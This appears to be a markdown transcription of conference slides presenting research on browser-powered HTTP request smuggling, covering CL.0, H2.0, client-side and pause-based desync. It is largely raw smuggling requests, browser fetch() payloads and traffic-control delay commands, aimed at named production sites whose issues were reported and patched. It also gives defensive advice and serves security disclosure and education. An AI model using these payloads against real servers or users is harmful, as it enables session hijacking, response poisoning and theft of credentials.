# Browser-Powered Desync Attacks
## James Kettle

### A New Frontier in HTTP Request Smuggling

**Disclaimer:**
These slides are intended to supplement the presentation and are not suitable for standalone consumption. You can find the whitepaper and presentation recording at:
- [PortSwigger Research](https://portswigger.net/research/browser-powered-desync-attacks)
- Follow me on Twitter for updates: [@albinowax](https://twitter.com/albinowax)

---

### Problem and Discovery

**2019:**
- **Problem:** False positives in Request Smuggling
- **Solution:** Never reuse HTTP/1.1 connections

**2021:**
- **Problem:** Connection-locked request smuggling
- **Solution:** Always reuse HTTP/1.1 connections

**CVE-2020-12440:**
- Replicated in a lab on PortSwigger Academy
- Tools: [HTTP Request Smuggler](https://portswigger.net/http-request-smuggler), [Turbo Intruder](https://portswigger.net/turbo-intruder)
- Full PoC exploit code available in the whitepaper

---

### Outline
1. HTTP Handling Anomalies
2. Client-side Desync
3. Pause-based Desync
4. Defense & Takeaways
5. Q&A

---

### HTTP Handling Anomalies

#### The Request is a Lie

**Connection State Attacks: First-Request Validation**

```
GET / HTTP/1.1
Host: www.example.com

GET / HTTP/1.1
Host: intranet.example.com

GET / HTTP/1.1
Host: www.example.com

GET / HTTP/1.1
Host: intranet.example.com
```

**Response:**
```
HTTP/1.1 200 OK
-connection reset-
HTTP/1.1 200 OK
HTTP/1.1 200 OK
Internal website
```

**Connection State Attacks: First-Request Routing**

```
POST /pwreset HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net

POST /pwreset HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net
```

**Response:**
```
HTTP/1.1 302 Found
Location: /login

HTTP/1.1 421 Misdirected

HTTP/1.1 302 Found
Location: /login

HTTP/1.1 302 Found
Location: /login
```

**Email:**
```
Reset your password: https://psres.net/reset?k=secret
```

**Surprise Factor:**

```
POST / HTTP/1.1
Transfer-Encoding: chunked
0
malicious-prefix
:method POST
:path /
```

**ALB (Reported and Fixed):**
- Reported: 2021-07-28
- Fixed: 2021-08-05

---

### Detecting Regular CL.TE

```
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
GET /hopefully404 HTTP/1.1
Foo: bar
```

**Response:**
```
HTTP/1.1 301 Moved Permanently
Location: /en
READ
READ
```

### Detecting Connection-Locked CL.TE

```
POST / HTTP/1.1
Content-Length: 41
Transfer-Encoding: chunked
0
GET /hopefully404 HTTP/1.1
Foo: bar
```

**Response:**
```
HTTP/1.1 301 Moved Permanently
Location: /en
HTTP/1.1 404 Not Found
Content-Length: 162…
READ
READ
```

**Finding: Barracuda ADC in front of IIS. Patched in 6.5.0.007**

### CL.0 Browser-Compatible Desync

```
POST / HTTP/1.1
Host: redacted
Content-Length: 3
xyz
```

**Response:**
```
HTTP/1.1 200 OK
HTTP/1.1 405 Method Not Allowed
```

### Taxonomy

- **TE.CL and CL.TE:** Classic request smuggling
- **H2.CL and H2.TE:** HTTP/2 downgrade smuggling
- **CL.0:** This attack
- **H2.0:** Implied by CL.0
- **0.CL and 0.TE:** Unexploitable without pipelining

### H2.0 on amazon.com

```
POST /b/? HTTP/2
Host: www.amazon.com
Content-Length: 31
GET /favicon.ico HTTP/1.1
X: X
```

**Response:**
```
HTTP/2 200 OK
Content-Type: text/html
HTTP/2 200 OK
Content-Type: image/x-icon
```

**POST Example:**

```
POST /gp/customer-reviews/aj/private/reviewsGallery/get-image-gallery HTTP/1.1
X-Amz-SideCar-Enabled: on
X-Amz-Sidecar-Destination-Host: http://us-other-iad7.amazon.com:1080
X-Forwarded-Host: …
```

**Akamai - Detection:**

```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 30
GET /robots.txt HTTP/1.1
X: Y
```

**Response:**
```
HTTP/1.1 301 Moved Permanently
Location: /assets/
HTTP/1.1 200 OK
Allow: /
```

**Fetch Example:**

```javascript
fetch('https://www.capitalone.ca/assets', { 
  method: 'POST', 
  body: "GET /robots.txt HTTP/1.1\r\nX: Y", 
  mode: 'no-cors', 
  credentials: 'include'
})
```

### Akamai – Stacked HEAD

```
POST /assets HTTP/1.1
Host: www.capitalone.ca
Content-Length: 67
HEAD /404/?cb=123 HTTP/1.1
GET /x?evil() HTTP/1.1
X: Y
```

**Response:**
```
HTTP/1.1 301 Moved Permanently
Location: /assets/
HTTP/1.1 404 Not Found  
Content-Type: text/html
Content-Length: 432837
HTTP/1.1 301 Moved Permanently
Location: /x/?evil()
```

**Fetch Example:**

```javascript
fetch('https://www.capitalone.ca/assets', { 
  method: 'POST', 
  body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x= HTTP/1.1\r\nX: Y`, 
  credentials: 'include', 
  mode: 'cors'
}).catch(() => { 
  location = 'https://www.capitalone.ca/'
})
```

### Verisign – Fragmented Chunk

```
POST /%2f HTTP/1.1
Host: www.verisign.com
Content-Length: 81
HEAD / HTTP/1.1
Connection: keep-alive
Transfer-Encoding: chunked
34d
POST / HTTP/1.1
Host: www.verisign.com
Content-Length: 59
0
GET /evil() HTTP/1.1
Host: www.verisign.com
```

**Response:**
```
HTTP/1.1 200 OK
Content-Length: 54873
Content-Type: text/html
HTTP/1.1 301 Moved Permanently
Location: /en_US/evil()/index.xhtml
```

**Pulse Secure VPN – Last Resort Approach**

**Regular CSD Attacks:**
1. Create a poisoned connection
2. Trigger navigation

**Hijacking JS with a non-cacheable redirect:**
1. Navigate to target page
2. Guess when the page has loaded
3. Create some poisoned connections
4. Hope a JS import uses a poisoned connection

**Making it Plausible:**
- Pre-connect to normalize target page load time
- Combine with window for multiple attempts
- Identify page with non-cacheable JS import

### Pause-Based Desync

**Example:**

```
POST /admin HTTP/1.1
Content-Length: 41
GET /404 HTTP/1.1
Foo: bar
```

**Response:**
```
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
```

**Server-Side Pause-Based Desync:**

```
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
```

**Response:**
```
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
```

**Requirement: Front-end forwards request headers without waiting for body**

**Turbo Intruder Queue Arguments:**
- pauseTime=20000
- pauseBefore=-41
- pauseMarker=['GET']

### Pause-Based Desync with ALB

**Example:**

```
POST /admin HTTP/1.1
Content-Length: 23
GET /404 HTTP/1.1
X: Y
```

**Response:**
```
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
```

### Zero-Padding Chunk Size

**Stripped Chunk Extensions:**
- TCP duplicate packet
- TCP out-of-order packet
- 66-hour attack

**Client-Side Pause-Based Desync via MITM:**

```
POST /admin HTTP/1.1
Content-Length: 28
GET /404 HTTP/1.1
X: PADPAD
```

**Response:**
```
HTTP/1.1 403 Forbidden
HTTP/1.1 404 Not Found
```

**Theory:**
- Attacker website sends request, padded to cause TCP fragmentation
- MITM identifies the TCP packet containing the request body via the size
- MITM delays this packet, causing a server timeout & pause-based desync
- The delayed packet is then interpreted as a new message

**MITM:**

**MITM-Based Desync Using Traffic Control:**

```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap
# Flag packets to 34.255.5.242 if between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3
# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```

### Demo: Breaking HTTPS on Apache

**Varnish CVE-2022-23959:**
- Reported: 2021-12-17
- Patched: 2022-01-25 (7.0.2/6.6.2)

**Apache CVE-2022-22720:**
- Reported: 2021-12-17
- Patched: 2022-03-14 (2.4.53)

### Defense

- Use HTTP/2 end-to-end
- Don’t downgrade/rewrite HTTP/2 requests to HTTP/1
- Don't roll your own HTTP server, but if you do:
  - Never assume there's no Content-Length
  - Default to discarding the socket
  - Don't attach state to a connection

### References & Further Reading

- [Whitepaper, Slides & Academy Topic](https://portswigger.net/research/browser-powered-desync-attacks)
- [PortSwigger Web Security](https://portswigger.net/web-security/request-smuggling/browser)
- [Source Code on GitHub](https://github.com/PortSwigger)
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks)
- [HTTP/2 Desync Attacks](https://portswigger.net/research/http2)
- [HTTP Request Smuggling](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf)
- [HTTP Request Smuggling in 2020](https://www.youtube.com/watch?v=Zm-myHU8-RQ)
- [Response Smuggling](https://www.youtube.com/watch?v=suxDcYViwao)

### Takeaways

- The request is a lie
- No front-end is no escape
- All you need is a server taken by surprise

**Contact:**
- Email: [PI:EMAIL]
- Twitter: [@albinowax]

---

This document provides a comprehensive overview of browser-powered desync attacks, their detection, and mitigation strategies.